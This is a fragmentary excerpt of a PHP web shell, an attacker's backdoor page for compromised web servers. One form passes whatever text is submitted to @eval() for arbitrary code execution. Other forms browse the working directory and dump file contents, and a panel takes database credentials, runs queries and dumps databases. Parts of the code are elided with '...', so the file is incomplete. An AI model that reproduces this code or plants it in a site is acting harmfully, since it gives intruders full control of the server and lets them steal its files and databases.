...
<hr>
<form method=post>
<textarea cols=120 rows=20 name='eval_value'><?php @eval($eval_value);?></textarea>
...
<input name='work_dir' value='<?php echo$e_work_dir?>' type=text size=120>
...
?>
<form method=post>
<textarea name='file_text' cols=120 rows=20><?php if(!($f))echo($e_work_dir.' not exists');else while(!feof($f))echo htmlspecialchars(fread($f,100000))?></textarea>
<input name='page' value='cmd' type=hidden>
<input name='work_dir' type=hidden value='<?php echo $e_work_dir?>' size=120>
...
<td>
<table align=left>
<tr><td>User :<input name='user' type=text value='<?php echo $user?>'></td><td>Passwd :<input name='passwd' type=text value='<?php echo $passwd?>'></td><td>Host :<input name='host' type=text value='<?php echo $host?>'></td><td>DB :<input name='db' type=text value='<?php echo $db?>'></td></tr>
<tr><textarea name='query' cols=120 rows=20><?php echo htmlspecialchars($query)?></textarea></tr>
</table>
</td>
<td>
<table>
<tr><td>DB :</td><td><input type=text name='db_dump' value='<?php echo $db?>'></td></tr>
